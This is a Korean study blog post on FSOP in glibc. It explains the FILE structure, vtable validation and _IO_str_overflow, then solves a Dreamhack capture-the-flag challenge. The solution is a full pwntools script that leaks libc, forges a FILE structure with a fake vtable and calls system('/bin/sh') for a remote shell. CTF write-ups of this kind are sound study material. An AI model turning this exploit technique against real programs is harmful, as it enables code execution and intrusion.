---
title: "[PWNABLE] FSOP"
description: "FSOPFile Stream Oriented ProgrammingC의 표준 라이브러리인 libc에서 file stream의 내부 필드를 조작하여 악의적인 코드를 수행하는 공격 기법이다. libc에서 파일 스트림은 FILE 구조체로 관리되며, 이 구조체의 필드들은 파일 입출력 작업을 추상화한다.file stream 구조체 "
date: "2024-06-24"
translation_key: "tistory-8af5082e9c5d"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-FSOP"
private: false
---

### FSOP  
  

File Stream Oriented Programming

C의 표준 라이브러리인 libc에서 file stream의 내부 필드를 조작하여 악의적인 코드를 수행하는 공격 기법이다. libc에서 파일 스트림은 FILE 구조체로 관리되며, 이 구조체의 필드들은 파일 입출력 작업을 추상화한다.

-   file stream 구조체 이해 : libc의 FILE 구조체를 분석하여 필드를 파악해야 한다.

\_IO\_FILE : 리눅스 시스템의 표준 라이브러리에서 파일 스트림을 나타내기 위한 구조체이다.

```
struct _IO_FILE_plus
{
FILE file;
  const struct _IO_jump_t *vtable;
};
struct _IO_FILE
{
  int _flags;
  char *_IO_read_ptr;
  char *_IO_read_end;
  char *_IO_read_base;
  char *_IO_write_base;
  char *_IO_write_ptr;
  char *_IO_write_end;
  char *_IO_buf_base;
  char *_IO_buf_end;
  char *_IO_save_base;
  char *_IO_backup_base;
  char *_IO_save_end;
  struct _IO_marker *_markers;
  struct _IO_FILE *_chain;
  int _fileno;
  int _flags2;
  __off_t _old_offset;
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];
  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

\_flags : 파일에 대한 권한 

(0xfbad0000이 매직넘버)

\_IO\_read\_ptr / \_IO\_write\_ptr : 파일 읽기와 쓰기에 대한 버퍼 포인터

\_IO\_read\_base / \_IO\_write\_base : 파일 읽기와 쓰기 버퍼의 시작 주소를 가리키는 포인터

\_IO\_read\_end / \_IO\_write\_end : 파일 읽기와 쓰기 버퍼의 끝을 가리키는 포인터

\_chain : 링크드 리스트를 만드는 필드

\_fileno : 파일 디스크립터 값

\_IO\_jump\_t\*vatlbe : 파일 관련 작업을 수행하는 가상 테이블

```
FILE *_IO_new_file_fopen(FILE *fp, const char
*filename, const char *mode,
                         int is32not64) {
  int oflags = 0, omode;
  int read_write;
  int oprot = 0666;
  int i;
  FILE *result;
  const char *cs;
  const char *last_recognized;
  if (_IO_file_is_open(fp)) return 0;
  switch (*mode) {
    case 'r':
      omode = O_RDONLY;
      read_write = _IO_NO_WRITES;
      break;
    case 'w':
      omode = O_WRONLY;
      oflags = O_CREAT | O_TRUNC;
      read_write = _IO_NO_READS;
      break;
    case 'a':
      omode = O_WRONLY;
      oflags = O_CREAT | O_APPEND;
      read_write = _IO_NO_READS | _IO_IS_APPENDING;
      break;
      ...
}
```

fopne으로 파일을 열 때 \_flags 변수를 전달하여 모드 값 설정한다.

\_IO\_new\_file\_fopne함수에서 권한을 확인하고 설정한다.

**\_IO\_FILE : vtable**

객체 지향 프로그래밍 언어에서 클래스 정의 및 가상 함수를 사용할 때 할당되는 테이블이다.

메모리에 가상 함수의 주소를 저장 및 사용하면 테이블을 기준으로 상대주소를 호출한다.

```
                               #define fread(p, m, n, s) _IO_fread (p, m, n, s)
                               size_t
                               _IO_fread (void *buf, size_t size, size_t count, FILE
                               *fp)
                               {
                                 size_t bytes_requested = size * count;
                                 size_t bytes_read;
                                 CHECK_FILE (fp, 0);
                                 if (bytes_requested == 0)
                                   return 0;
                                 _IO_acquire_lock (fp);
                                 _IO_release_lock (fp);
                                 return bytes_requested == bytes_read ? count :
                               bytes_read / size;
                               }
```

fread함수 호출 과정이다.

위 코드에서 \_IO\_sgetn함수를 호출하고 있다.

```
#define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP,
DATA, N)
#define JUMP2(FUNC, THIS, X1, X2)
(_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1, X2)
#define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable
( (THIS)))
size_t
_IO_sgetn (FILE *fp, void *data, size_t n)
{
  /* FIXME handle putback buffer here! */
  return _IO_XSGETN (fp, data, n);
}
```

\_IO\_sgetn함수에서 \_IO\_XSGETN 호출한다.

\_IO\_XSGETN함수는 vtable 구조체에 포함된 함수이다.

fread함수를 포함한 파일 함수들이 vtable 변수 참조하는 것을 확인 가능하다.

```
#define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP,
DATA, N)
#define JUMP2(FUNC, THIS, X1, X2)
(_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1, X2)
#define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable
( (THIS)))
size_t
_IO_sgetn (FILE *fp, void *data, size_t n)
{
  return _IO_XSGETN (fp, data, n);
}
```

vtable 참조하는 과정에서 IO\_validate\_vatlbe()호출한다.

\_libc\_IO\_vtables 섹션에 vtable 할당한다.

```
static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
  /* Fast path: The vtable pointer is within the
__libc_IO_vtables
section. */
uintptr_t section_length = __stop___libc_IO_vtables
- __start___libc_IO_vtables;
  const char *ptr = (const char *) vtable;
  uintptr_t offset = ptr - __start___libc_IO_vtables;
  if (__glibc_unlikely (offset >= section_length))
    /* The vtable pointer is not in the expected
section.  Use the
       slow path, which will terminate the process if
necessary.  */
    _IO_vtable_check ();
  return vtable;
}
```

vtable의 시작/끝 주소를 이용해서 세션의 크기를 파악한다.

```
int
_IO_str_overflow (_IO_FILE *fp, int c)
{
  int flush_only = c == EOF;
  _IO_size_t pos;
  if (fp->_flags & _IO_NO_WRITES)
      return flush_only ? 0 : EOF;
  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
    {
      fp->_flags |= _IO_CURRENTLY_PUTTING;
      fp->_IO_write_ptr = fp->_IO_read_ptr;
      fp->_IO_read_ptr = fp->_IO_read_end;
    }
  pos = fp->_IO_write_ptr - fp->_IO_write_base;
  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
    {
      if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
      return EOF;
      else
      {
        char *new_buf;
        char *old_buf = fp->_IO_buf_base;
        size_t old_blen = _IO_blen (fp);
        _IO_size_t new_size = 2 * old_blen + 100;
        if (new_size < old_blen)
          return EOF;
        new_buf
          = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
```

\_IO\_str\_overflow는 \_libc\_IO\_vtables에 포함되어 있다.

마지막에 \_s.\_allocate\_buffer 함수 포인터를 호출한다.

```
#define _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base)
size_t old_blen = _IO_blen (fp);
_IO_size_t new_size = 2 * old_blen + 100;
if (new_size < old_blen)
return EOF;
```

함수 인자로 new\_size 변수 전달한다.

\_IO\_buf\_end와 \_IO\_buf\_base의 연산값을 이용한다.

이 것으로 new\_size 변수를 조작가능하다.

```
int
_IO_str_overflow (_IO_FILE *fp, int c)
{
  int flush_only = c == EOF;
  _IO_size_t pos;
if (fp->_flags & _IO_NO_WRITES)
    return flush_only ? 0 : EOF;
if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
  {
    fp->_flags |= _IO_CURRENTLY_PUTTING;
    fp->_IO_write_ptr = fp->_IO_read_ptr;
    fp->_IO_read_ptr = fp->_IO_read_end;
}
pos = fp->_IO_write_ptr - fp->_IO_write_base;
if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
  {
    if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
    return EOF;
    else
    {
      char *new_buf;
      char *old_buf = fp->_IO_buf_base;
      size_t old_blen = _IO_blen (fp);
      _IO_size_t new_size = 2 * old_blen + 100;
      if (new_size < old_blen)
        return EOF;
      new_buf
        = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
```

함수 포인터를 호출하기위해 확인해야 하는 코드이다.

해당 부분을 분리해서 확인하겠다.

```
 int flush_only = c == EOF;
 _IO_size_t pos;
pos = fp->_IO_write_ptr - fp->_IO_write_base;
 if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
```

\_IO\_write\_base와 \_IO\_write\_ptr을 이용한다.

flush\_only의 초기값은 0이다.

조건 부분을 보면 if(pos >= \_IO\_blen(fp))이다.

\_IO\_write\_ptr = func@add  
\_IO\_write\_base = 0  
pos = func@add

dreamhack 문제 중 Bypass \_IO\_str\_overflow을 풀어보겠다.

```
#include <stdio.h>
#include <unistd.h>
FILE *fp;
void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}
int main() {
  init();
  fp = fopen("/dev/urandom", "r");
  printf("stdout: %p\n", stdout);
  printf("Data: ");
  read(0, fp, 300);
  fclose(fp);
}
```

stdout 포인터의 주소를 출력해주기 때문에 libc\_base를 구할 수 있다.

```
p.recvuntil("stdout: ")
stdout_leak = int(p.recvuntil(b"\n").strip(b"\n"),16)
libc_base = stdout_leak - libc.symbols['_IO_2_1_stdout_']
io_file_jumps = libc_base + libc.symbols['_IO_file_jumps']
io_str_overflow = io_file_jumps + 0xd8
fake_vtable = io_str_overflow - 16
binsh = libc_base + next(libc.search(b"/bin/sh"))
system_add = libc_base + libc.symbols['system']
fp = elf.symbols['fp']
```

libc\_base와 필요한 주소들을 구하는 과정이다.

추가로 fake\_vtable주소를 구할 수 있다.

new\_size 변수는 \_IO\_buf\_end와 base를 이용하여 구하기 때문에

\_IO\_buf\_end를 binsh 문자열 주소로 설정하고 base를 0으로 설정하면

new\_size 변수는 binsh 문자열을 가리키게 된다.

다시 조건을 살펴보면

```
 int flush_only = c == EOF;
 _IO_size_t pos;
pos = fp->_IO_write_ptr - fp->_IO_write_base;
 if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
```

\_IO\_write\_ptr과 \_IO\_buf\_end를 동일하게 설정해야 한다.

\-> \_IO\_str\_overflow의 조건을 통과하기 위해서다.

```
       new_buf
         = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer)
(new_size);
```

코드의 마지막에서 fclose함수 내부에서 \_IO\_FINISH를 호출한다.

\_IO\_FINISH는 vatble주소부터 16바이트 떨어진 위치에 있는 주소를 호출한다.

\=> vtable 주소를 (IO\_str\_overflow - 16) 주소로 덮으면 fcloase에 의해 IO\_str\_overflow 함수가 호출된다.

```
from pwn import *

p = remote('host3.dreamhack.games', 15070)
libc = ELF('./libc.so.6')
elf = ELF('./bypass_valid_vtable')

p.recvuntil("stdout: ")
stdout_leak = int(p.recvuntil(b"\n").strip(b"\n"),16)
libc_base = stdout_leak - libc.symbols['_IO_2_1_stdout_']

io_file_jumps = libc_base + libc.symbols['_IO_file_jumps']
io_str_overflow = io_file_jumps + 0xd8
fake_vtable = io_str_overflow - 16
binsh = libc_base + next(libc.search(b"/bin/sh"))
system_add = libc_base + libc.symbols['system']
fp = elf.symbols['fp']

payload = p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(int((binsh - 100) / 2))
payload += p64(0x0)
payload += p64(0x0)
payload += p64(int((binsh - 100) / 2))
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(fp + 0x80)
payload += p64(0x0)*9
payload += p64(fake_vtable)
payload += p64(system_add)
p.sendline(payload)

p.interactive()
```

실행하면 flag를 얻을 수 있다.

![](/assets/images/tistory/tistory-8af5082e9c5d/001.png)
